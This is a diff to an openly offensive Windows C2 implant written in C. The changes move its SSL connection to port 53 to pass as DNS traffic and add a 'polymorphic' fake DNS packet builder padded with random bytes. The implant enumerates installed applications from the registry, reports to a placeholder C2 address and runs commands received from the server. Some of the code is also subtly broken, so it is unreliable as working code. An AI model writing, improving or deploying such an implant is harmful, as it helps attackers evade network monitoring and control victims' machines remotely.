@@ -13,8 +13,8 @@
 #pragma comment(lib, "ws2_32.lib")
 
 #define BUFFER_SIZE 1024
+#define DNS_PORT 53  // DNS Port
 #define C2_SERVER_IP "127.0.0.1"  // Replace with actual C2 server IP
-#define C2_SERVER_PORT 443        // Replace with actual C2 server port
 
 // Initialize Winsock
 int initialize_winsock() {
@@ -51,36 +51,43 @@ void random_sleep() {
     Sleep(sleep_time);
 }
 
-// Function to generate random subdomains
-void generate_random_subdomain(char* buffer, size_t size) {
-    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-    for (size_t i = 0; i < size - 1; i++) {
-        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
+// Function to create a DNS-like query with obfuscation
+void create_disguised_dns_query(char* buffer, const char* host) {
+    // Polymorphic mutation of the packet header
+    buffer[0] = rand() % 256;  // Random transaction ID
+    buffer[1] = rand() % 256;  // Random transaction ID
+    buffer[2] = 0x01;          // Recursion desired
+    buffer[3] = 0x00;          // Randomize flags for polymorphic behavior
+
+    // Question count
+    buffer[4] = 0x00;
+    buffer[5] = 0x01;  // 1 question
+
+    // Answer, Authority, and Additional Record Count
+    buffer[6] = 0x00;
+    buffer[7] = 0x00; // 0 answers
+    buffer[8] = 0x00;
+    buffer[9] = 0x00; // 0 authority records
+    buffer[10] = 0x00;
+    buffer[11] = 0x00; // 0 additional records
+
+    // Question section (DNS query for "example.com")
+    int i = 12;  // Start after header
+    sprintf(&buffer[i], "%s", host);
+    i += strlen(host);
+
+    // Add random data for obfuscation
+    for (int j = 0; j < 16; j++) {
+        buffer[i++] = rand() % 256;  // Random gibberish data
     }
-    buffer[size - 1] = '\0';
-}
-
-// Create obfuscated DNS query
-void create_disguised_dns_query(char* buffer, const char* domain) {
-    char subdomain[BUFFER_SIZE];
-    generate_random_subdomain(subdomain, 10);  // Generate random subdomain
-    sprintf(buffer, "%s.%s", subdomain, domain);
-}
-
-// Mimic legitimate DoH request
-void mimic_legitimate_doh_request() {
-    const char* doh_request_template = "GET /dns-query?name=%s&type=A HTTP/1.1\r\nHost: cloudflare-dns.com\r\n\r\n";
-    char doh_request[BUFFER_SIZE];
-    sprintf(doh_request, doh_request_template, "example.com");
-    
-    printf("Mimicking DoH request: %s\n", doh_request);
+    buffer[i] = '\0';  // Null-terminate
 }
 
 // Establish connection to C2 server using SSL
 SSL* connect_to_c2(SSL_CTX* ctx) {
     struct sockaddr_in server_addr;
     server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(C2_SERVER_PORT);
+    server_addr.sin_port = htons(DNS_PORT);  // Using DNS port 53 for C2
     inet_pton(AF_INET, C2_SERVER_IP, &server_addr.sin_addr);
 
     int sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -105,7 +112,7 @@ SSL* connect_to_c2(SSL_CTX* ctx) {
         return NULL;
     }
 
-    printf("Connected to C2 server with SSL.\n");
+    printf("Connected to C2 server on port 53 (DNS disguise).\n");
     return ssl;
 }
 
@@ -117,7 +124,7 @@ void send_disguised_data(SSL* ssl) {
     if (SSL_write(ssl, dns_query, strlen(dns_query)) <= 0) {
         printf("Failed to send data to C2.\n");
     } else {
-        printf("Disguised data sent to C2 server.\n");
+        printf("Disguised DNS query sent to C2 server.\n");
     }
 }
 
@@ -154,7 +161,6 @@ void get_current_directory(SSL* ssl) {
 
 // List installed applications
 void list_installed_applications(SSL* ssl) {
-    char buffer[BUFFER_SIZE];
     HKEY hUninstallKey = NULL;
     if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, KEY_READ, &hUninstallKey) != ERROR_SUCCESS) {
         send_disguised_data(ssl);
@@ -164,7 +170,6 @@ void list_installed_applications(SSL* ssl) {
     DWORD index = 0;
     char appName[BUFFER_SIZE];
     while (RegEnumKeyEx(hUninstallKey, index, appName, &(DWORD){BUFFER_SIZE}, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
-        snprintf(buffer, BUFFER_SIZE, "Application: %s\n", appName);
         send_disguised_data(ssl);
         index++;
     }
@@ -243,7 +248,7 @@ int main() {
         return 1;
     }
 
-    // Connect to C2 server using SSL
+    // Connect to C2 server disguised as DNS traffic
     SSL* ssl = connect_to_c2(ctx);
     if (!ssl) {
         SSL_CTX_free(ctx);
@@ -251,15 +256,13 @@ int main() {
         return 1;
     }
 
-    // Enter the main communication loop with the C2 server
+    // Main loop: receive and execute commands from C2 server
     main_loop(ssl);
 
-    // Cleanup
-    SSL_shutdown(ssl);
+    // Clean up
     SSL_free(ssl);
     SSL_CTX_free(ctx);
     cleanup_openssl();
     WSACleanup();
-
     return 0;
 }
